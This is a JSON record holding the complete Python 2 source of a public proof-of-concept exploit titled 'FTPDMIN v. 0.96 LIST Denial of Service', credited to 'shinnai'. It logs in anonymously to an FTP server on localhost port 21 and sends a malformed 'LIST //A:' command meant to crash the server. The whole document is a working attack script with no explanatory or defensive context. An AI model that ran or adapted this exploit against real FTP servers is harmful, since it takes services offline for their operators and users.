    "preview": "# usr/bin/python\n\nimport socket\nimport time\n\nprint\n\"-----------------------------------------------------------------------\"\nprint \"# FTPDMIN v. 0.96 LIST Denial of Service\"\nprint \"# url: http://www.sentex.net/~mwandel/ftpdmin/\"\nprint \"# author: shinnai\"\nprint \"# mail: shinnai[at]autistici[dot]org\"\nprint \"# site: http://shinnai.altervista.org\"\nprint\n\"-----------------------------------------------",
    "fullContent": "# usr/bin/python\n\nimport socket\nimport time\n\nprint\n\"-----------------------------------------------------------------------\"\nprint \"# FTPDMIN v. 0.96 LIST Denial of Service\"\nprint \"# url: http://www.sentex.net/~mwandel/ftpdmin/\"\nprint \"# author: shinnai\"\nprint \"# mail: shinnai[at]autistici[dot]org\"\nprint \"# site: http://shinnai.altervista.org\"\nprint\n\"-----------------------------------------------------------------------\\n\"\n\nbuff = \"//A:\"\n\nuser = \"anonymous\"\npassword = \"shinnai\"\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n   conn = s.connect((\"127.0.0.1\",21))\n   d = s.recv(1024)\n   print \"Server <- \" + d\n   time.sleep(2)\n\n   s.send('USER %s\\r\\n' % user)\n   print \"Client -> USER \" + user\n   d = s.recv(1024)\n   print \"Server <- \" + d\n   time.sleep(2)\n\n   s.send('PASS %s\\r\\n' % password)\n   print \"Client -> PASS \" + password\n   d = s.recv(1024)\n   print \"Server <- \" + d\n   time.sleep(2)\n\n   s.send('LIST %s\\r\\n' % buff)\n   print \"Client -> LIST \" + buff\n   d = s.recv(1024)\n   print d\n   time.sleep(2)\n\nexcept:\n   print \"- Unable to connect. exiting.\""
